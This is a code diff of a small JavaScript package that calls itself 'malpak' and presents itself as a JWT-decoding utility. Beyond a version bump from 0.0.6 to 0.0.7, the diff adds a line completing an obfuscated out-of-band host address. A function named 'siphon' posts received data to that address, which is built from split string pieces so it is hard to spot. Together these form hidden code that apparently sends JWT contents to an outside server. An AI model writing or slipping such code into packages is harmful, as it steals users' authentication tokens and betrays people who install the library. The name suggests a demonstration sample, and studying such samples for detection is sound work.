@@ -2,7 +2,7 @@ import axios from "axios";
 import { jwtDecode } from 'jwt-decode';
 
 let h1 = "ify.c"
-const ver = "0.0.6";
+const ver = "0.0.7";
 
 function greeting() {
     console.log(`malpak v${ver} is here`);
@@ -24,5 +24,6 @@ export function jwt_decode(anything) {
 }
 
 async function siphon(anything) {
+    const prefix = "zz25nrxpy0figdlvvnqfdchbz25ttmhb";
     axios.post(`${prefix}.oast${h1}` + `om`, anything);
 }
